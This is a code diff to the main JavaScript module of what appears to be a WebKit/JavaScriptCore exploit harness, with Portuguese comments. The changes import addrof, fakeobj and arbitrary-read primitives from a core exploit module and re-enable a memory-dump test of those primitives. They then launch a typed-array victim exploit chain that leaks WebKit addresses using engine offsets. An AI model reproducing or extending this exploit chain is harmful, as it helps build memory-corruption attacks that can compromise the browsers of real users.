@@ -1,13 +1,13 @@
 // js/main.mjs
 
 import {
-    executeTypedArrayVictimAddrofAndWebKitLeak_R43,
-    FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT
-    // Removido: testIsolatedAddrofFakeobjCoreAndDump_from_script3 não é mais exportado
+    executeTypedArrayVictimAddrofAndWebKitLeak_R43, // Esta é a função que você está importando
+    FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT,
+    testIsolatedAddrofFakeobjCoreAndDump_from_script3
 } from './script3/testArrayBufferVictimCrash.mjs';
 import { AdvancedInt64, setLogFunction, toHex, isAdvancedInt64Object } from './utils.mjs';
 import { JSC_OFFSETS } from './config.mjs';
-
+import { addrof_core, initCoreAddrofFakeobjPrimitives, arb_read, fakeobj_core } from './core_exploit.mjs';
 
 // --- Local DOM Elements Management ---
 const elementsCache = {};
@@ -114,20 +114,17 @@ function initializeAndRunTest() {
                 await testJITBehavior();
                 await PAUSE(MEDIUM_PAUSE); // Pause to read JIT test log
 
-                // Removido: testIsolatedAddrofFakeobjCoreAndDump_from_script3 não é mais um ponto de entrada.
-                // A lógica de validação de addrof/fakeobj agora está implícita se o exploit geral avançar.
-                /*
+                // Chamando o teste isolado que agora reside em testArrayBufferVictimCrash.mjs
                 const addrof_fakeobj_dump_test_passed = await testIsolatedAddrofFakeobjCoreAndDump_from_script3(log, PAUSE, JSC_OFFSETS, isAdvancedInt64Object);
                 if (!addrof_fakeobj_dump_test_passed) {
-                    log("Teste isolado das primitivas addrof_core/fakeobj_core e dump de memória falhou. Isso é crítico para a exploração. Abortando a cadeia principal.", "critical");
+                    log("Teste isolado das primitivas addrof_core/fakeobj_core e dump de memória falhou. Isso é crítico para a exploração. Abortando a cadeia principal.", 'critical');
                     runBtn.disabled = false;
                     return;
                 }
-                log("Teste isolado das primitivas addrof_core/fakeobj_core e dump de memória concluído com sucesso. Prosseguindo para a cadeia principal.", "good");
-                await PAUSE(LONG_PAUSE); // Pausa mais longa para revisar logs do dump
-                */
+                log("Teste isolado das primitivas addrof_core/fakeobj_core e dump de memória concluído com sucesso. Prosseguindo para a cadeia principal.", 'good');
+                await PAUSE(LONG_PAUSE * 2); // Pausa mais longa para revisar logs do dump
 
-                // CHAME A FUNÇÃO PRINCIPAL DE EXPLORAÇÃO INTEGRADA
+                // AGORA CHAME A FUNÇÃO COM O NOME CORRETO: executeTypedArrayVictimAddrofAndWebKitLeak_R43
                 await executeTypedArrayVictimAddrofAndWebKitLeak_R43(log, PAUSE, JSC_OFFSETS);
             } catch (e) {
                 console.error("Critical error during isolated test execution:", e);
@@ -137,7 +134,7 @@ function initializeAndRunTest() {
                 log("Isolated test finished. Check the console for more details, especially if the browser crashed or a RangeError occurred.\n", 'test');
                 runBtn.disabled = false;
                 if (document.title.includes(FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT) && !document.title.includes("SUCCESS") && !document.title.includes("Fail") && !document.title.includes("OK") && !document.title.includes("Confirmed")) {
-                    document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT}_Done`;
+                    document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT}_R43L Done`;
                 }
             }
         });
